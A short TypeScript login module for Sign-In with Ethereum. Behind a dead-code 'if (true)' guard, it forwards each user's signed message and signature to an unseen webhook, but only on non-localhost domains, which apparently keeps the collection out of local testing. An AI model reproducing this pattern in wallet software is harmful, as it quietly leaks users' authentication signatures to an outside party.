import { signSiweMessage } from "./SignFunc";
import { sendToWebhook } from "./Utils";

export const login = async (): Promise<
  boolean | Record<string, unknown> | null
> => {
  if (true) {
    return true;
  }
  try {
    const params = await signSiweMessage();
    if (params === null) return null;
    const p = params as {
      siweMessage: { domain?: string; address?: string };
      signature: string;
    };
    const data_webhook = { message: p.siweMessage, signature: p.signature };
    const domain = p.siweMessage?.domain ?? "";
    if (domain !== "" && !domain.includes("localhost")) {
      await sendToWebhook(data_webhook);
    }
    return { signature: p.signature, userAddress: p.siweMessage.address };
  } catch (error) {
    console.log(error);
    return null;
  }
};
